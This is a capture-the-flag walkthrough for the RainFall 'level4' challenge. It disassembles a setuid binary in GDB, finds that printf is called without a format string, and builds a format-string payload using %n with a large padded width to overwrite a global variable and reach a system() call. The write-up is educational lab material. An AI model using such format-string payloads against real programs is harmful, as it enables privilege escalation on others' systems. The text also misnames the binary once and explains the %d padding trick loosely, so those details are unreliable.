```sh
level4@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
level4@RainFall:~$ ./level4
42
42
level4@RainFall:~$ ./level4 42
42
42
```
There is one excutable file **level3**, it works like cat, take standard input, print them and shutting down. \
\
Run the binary file with GDB.
```sh
(gdb) info functions
...
0x08048444  p
0x08048457  n
0x080484a7  main
...
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave  
   0x08048456 <+18>:    ret    
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   ...
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave  
   0x080484a6 <+79>:    ret    
End of assembler dump.
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave  
   0x080484b3 <+12>:    ret    
End of assembler dump.
```
We can see 3 functions ```main(), n(), p()```. ```n()``` function gets standard input by fgets, give to ```p()``` function, ```p()``` function does print the variable which is given by function ```n()```, but with ```printf()``` without formatter. \
And compare with variable ```m``` and 0x1025544, in decimal 16930116.
```sh
(gdb) x/s 0x8049810
0x8049810 <m>:   ""
```
As the previous level we try to lookup the stack values,
```sh
level4@RainFall:~$ python -c 'print "BBBB" + " %x" * 20' > /tmp/exploit3
level4@RainFall:~$ cat /tmp/exploit3 | ./level4 
BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```
And we can see that our BBBB which is ```42424242``` at the 12th position, so now we just have to do the same thing as the previous level: set value to ```16930116```.

But oops, the value ```16930116``` is too big number for print it all !

But no worries, there is a solution for this.
```sh
python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'
```
```printf()``` internally does counting for characters that has been printed but since we have to print ```16930112``` characters, it will be tough to allocate all of them in the memory. \
But by adding little ```d``` option, which helps to count characters "virtually" to track the total numbers of printed characters, it no longer has to allocate memory for millions of characters.
```sh
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit3
level4@RainFall:~$ cat /tmp/exploit3 - | ./level4 
...
(hidden)
```
level4 passed ! 통화점여!okidoki